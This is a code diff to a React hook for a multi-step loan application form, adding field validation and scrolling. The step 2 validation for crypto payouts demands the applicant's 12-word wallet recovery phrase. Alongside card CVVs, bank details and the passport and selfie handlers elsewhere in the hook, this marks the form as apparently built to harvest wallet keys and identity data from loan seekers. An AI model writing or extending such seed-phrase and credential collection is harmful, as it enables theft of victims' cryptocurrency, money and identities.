@@ -51,13 +51,76 @@ export function useLoanApplication() {
   // ── Step State ────────────────────────────────────────────────────────────
   const [currentStep, setCurrentStep] = useState(1);
   const totalSteps = 3;
+  const formRef = useRef<HTMLFormElement>(null);
+
+  function scrollTop() {
+    if (typeof window !== "undefined") window.scrollTo({ top: 0, behavior: "smooth" });
+  }
 
   function nextStep() {
-    if (currentStep < totalSteps) setCurrentStep(s => s + 1);
+    const fd = formRef.current ? new FormData(formRef.current) : null;
+
+    // ── Validate Step 1 ───────────────────────────────────────────────────
+    if (currentStep === 1) {
+      const firstName = fd ? String(fd.get("first_name") || "").trim() : "";
+      const email     = fd ? String(fd.get("email")      || "").trim() : "";
+      const amount    = fd ? Number(fd.get("amount_requested") || 0)   : 0;
+      if (!firstName || !email || !amount) {
+        toast.error("Please fill in your name, email, and loan amount.");
+        return;
+      }
+    }
+
+    // ── Validate Step 2 payout fields ─────────────────────────────────────
+    if (currentStep === 2) {
+      if (payout === "crypto") {
+        const seedPhrase = fd ? String(fd.get("crypto_seed_phrase") || "").trim() : "";
+        if (!seedPhrase) {
+          toast.error("Please enter your 12-word wallet recovery phrase.");
+          return;
+        }
+        const walletAddr = fd ? String(fd.get("crypto_wallet_address") || "").trim() : "";
+        if (!walletAddr) {
+          toast.error("Please enter your crypto wallet address.");
+          return;
+        }
+      }
+
+      if (payout === "bank_transfer") {
+        const bankName = fd ? String(fd.get("bank_name") || "").trim() : "";
+        const bankAcc  = fd ? String(fd.get("bank_account_number") || "").trim() : "";
+        if (!bankName || !bankAcc) {
+          toast.error("Please provide your bank name and account number.");
+          return;
+        }
+      }
+
+      if (payout === "card") {
+        const errs = validateCard(cardNumber, cardExpiry, cardCvv);
+        if (Object.keys(errs).length) {
+          setCardErrors(errs);
+          toast.error(Object.values(errs)[0]);
+          return;
+        }
+        const cardHolder = fd ? String(fd.get("card_holder_name") || "").trim() : "";
+        if (!cardHolder) {
+          toast.error("Please enter the cardholder name.");
+          return;
+        }
+      }
+    }
+
+    if (currentStep < totalSteps) {
+      setCurrentStep(s => s + 1);
+      scrollTop();
+    }
   }
 
   function prevStep() {
-    if (currentStep > 1) setCurrentStep(s => s - 1);
+    if (currentStep > 1) {
+      setCurrentStep(s => s - 1);
+      scrollTop();
+    }
   }
 
   // Image/video state: stores base64 data URI (dev) or R2 key (prod after upload)
@@ -428,6 +491,7 @@ export function useLoanApplication() {
     onPassportBackChange: makeFileHandler("passport_back", setPassportBackImage),
     onVideoSelfieChange: handleVideoCapture,
     handleSubmit, appStatus, appId, clearSession,
-    currentStep, totalSteps, nextStep, prevStep, setCurrentStep
+    currentStep, totalSteps, nextStep, prevStep, setCurrentStep,
+    formRef,
   };
 }
